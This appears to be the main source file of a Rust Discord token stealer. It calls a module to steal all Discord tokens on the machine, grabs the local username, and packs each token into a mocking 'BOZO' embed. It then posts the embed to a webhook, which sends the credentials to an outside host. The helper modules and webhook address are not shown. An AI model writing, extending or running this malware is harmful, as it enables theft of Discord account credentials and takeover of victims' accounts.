mod modules;

use crate::modules::discordapp::discordapp::Discarder;
use crate::modules::webhook::embed::EmbedBuilder;
use crate::modules::webhook::webhook;

use tokio;

use whoami;

#[tokio::main(flavor = "current_thread")]
async fn main() {
    let discarder = Discarder::new();
    let tokens = discarder.steal_all_your_discord_tokens().unwrap();

    let name = whoami::username();

    let mut builder = EmbedBuilder::new()
        .set_title("🚨🚨🚨 BOZO 🚨🚨🚨".to_string())
        .set_description(String::from("rip ") + &name + " (bozo) 🤣");
    
    let mut idx = 0;

    for token in tokens {
        builder = builder.clone().add_field(String::from("token") + &idx.to_string(), token, Some(false));
        idx += 1;
    }

    let embed = builder.build();
    webhook::post(vec![embed]).await;
} 